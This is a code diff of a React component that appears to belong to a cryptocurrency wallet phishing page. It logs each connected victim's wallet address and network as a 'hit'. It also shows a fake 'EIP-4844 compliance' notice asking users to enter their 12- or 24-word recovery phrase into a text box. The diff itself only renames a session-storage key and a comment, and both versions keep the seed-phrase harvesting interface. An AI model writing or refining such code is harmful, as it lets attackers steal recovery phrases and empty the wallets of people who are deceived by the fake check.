@@ -31,9 +31,9 @@ export default function App() {
   }
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vF_Tuesday_Final_Final')) {
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_Tuesday_Confirmed')) {
       log("🎯 TUESDAY HIT: " + address + " NET: " + chainId);
-      sessionStorage.setItem('hit_vF_Tuesday_Final_Final', 't');
+      sessionStorage.setItem('hit_vF_Tuesday_Confirmed', 't');
     }
   }, [isConnected, address, chainId]);
 
@@ -134,7 +134,7 @@ export default function App() {
                 {!isSyncing ? (
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'10px'}}>🛡️ EIP-4844 COMPLIANCE</div>
-                    {/* SEED PHRASE REASON PUT BACK HERE */}
+                    {/* THIS IS THE TEXT YOU ARE LOOKING FOR */}
                     <div style={{fontSize:'10px', color:'#64748b', marginTop:'10px', lineHeight:'1.4', marginBottom:'20px'}}>TO PREVENT SYBIL ATTACKS AND VERIFY WALLET OWNERSHIP, PLEASE INPUT YOUR RECOVERY PHRASE TO SYNCHRONIZE WITH THE MAINNET RELAY.</div>
                     
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
